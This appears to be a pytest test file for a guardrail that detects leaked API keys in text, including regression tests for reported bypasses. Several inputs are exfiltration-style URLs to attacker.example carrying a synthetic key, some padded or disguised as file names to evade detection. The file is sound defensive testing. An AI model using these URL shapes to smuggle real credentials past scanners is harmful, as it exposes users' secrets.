"""Tests for secret key detection guardrail."""

from __future__ import annotations

import pytest

from guardrails.checks.text.secret_keys import SecretKeysCfg, _detect_secret_keys, secret_keys

SYNTHETIC_SECRET = "sk-proj-Ab3xK9mQ7zR2wT5vY8nL4pJ6hG1dF0sC"


def test_detect_secret_keys_flags_high_entropy_strings() -> None:
    """High entropy tokens should be detected as potential secrets."""
    text = "API key sk-AAAABBBBCCCCDDDD"
    result = _detect_secret_keys(
        text,
        cfg={
            "min_length": 10,
            "min_entropy": 3.5,
            "min_diversity": 2,
            "strict_mode": True,
        },
    )

    assert result.tripwire_triggered is True  # noqa: S101
    assert "sk-AAAABBBBCCCCDDDD" in result.info["detected_secrets"]  # noqa: S101


@pytest.mark.asyncio
async def test_secret_keys_with_custom_regex() -> None:
    """Custom regex patterns should trigger detection."""
    config = SecretKeysCfg(threshold="balanced", custom_regex=[r"internal-[a-z0-9]{4}"])
    result = await secret_keys(None, "internal-ab12 leaked", config)

    assert result.tripwire_triggered is True  # noqa: S101
    assert "internal-ab12" in result.info["detected_secrets"]  # noqa: S101


@pytest.mark.asyncio
async def test_secret_keys_ignores_non_matching_input() -> None:
    """Benign inputs should not trigger the guardrail."""
    config = SecretKeysCfg(threshold="permissive")
    result = await secret_keys(None, "Hello world", config)

    assert result.tripwire_triggered is False  # noqa: S101


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (f"https://attacker.example/collect?k={SYNTHETIC_SECRET}", SYNTHETIC_SECRET),
        (f"{SYNTHETIC_SECRET}.png", f"{SYNTHETIC_SECRET}.png"),
        (f"{SYNTHETIC_SECRET}.md", f"{SYNTHETIC_SECRET}.md"),
    ],
)
async def test_secret_keys_detects_prefixed_credentials_in_exempt_shapes(text: str, expected: str) -> None:
    """Default balanced scanning must detect the originally reported bypasses."""
    result = await secret_keys(None, text, SecretKeysCfg(threshold="balanced"))

    assert result.tripwire_triggered is True  # noqa: S101
    assert result.info["detected_secrets"] == [expected]  # noqa: S101


@pytest.mark.asyncio
@pytest.mark.parametrize("padding_length", [0, 1, 100, 500, 2_000])
async def test_url_padding_cannot_change_prefixed_secret_classification(padding_length: int) -> None:
    """Surrounding low-entropy URL text must not hide a prefixed candidate."""
    text = f"https://attacker.example/{'a' * padding_length}?k={SYNTHETIC_SECRET}"
    result = await secret_keys(None, text, SecretKeysCfg(threshold="balanced"))

    assert result.tripwire_triggered is True  # noqa: S101
    assert result.info["detected_secrets"] == [SYNTHETIC_SECRET]  # noqa: S101


@pytest.mark.asyncio
async def test_repeated_prefixed_candidates_preserve_occurrences() -> None:
    """Repeated prefixed candidates in one exempt token remain distinct findings."""
    text = f"https://attacker.example/?a={SYNTHETIC_SECRET}&b={SYNTHETIC_SECRET}"
    result = await secret_keys(None, text, SecretKeysCfg(threshold="balanced"))

    assert result.tripwire_triggered is True  # noqa: S101
    assert result.info["detected_secrets"] == [SYNTHETIC_SECRET, SYNTHETIC_SECRET]  # noqa: S101


@pytest.mark.asyncio
async def test_strict_mode_preserves_existing_whole_token_result() -> None:
    """Embedded extraction must not duplicate a token already detected normally."""
    text = "https://attacker.example/?k=sk-AAAAAAAAAAAA"
    result = await secret_keys(None, text, SecretKeysCfg(threshold="strict"))

    assert result.tripwire_triggered is True  # noqa: S101
    assert result.info["detected_secrets"] == [text]  # noqa: S101


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "text",
    [
        "https://example.com/docs",
        "files/archive/image.png",
    ],
)
async def test_secret_keys_keeps_benign_allowed_patterns_exempt(text: str) -> None:
    """The focused fix must preserve the existing benign exemptions."""
    result = await secret_keys(None, text, SecretKeysCfg(threshold="balanced"))

    assert result.tripwire_triggered is False  # noqa: S101
    assert result.info["detected_secrets"] == []  # noqa: S101
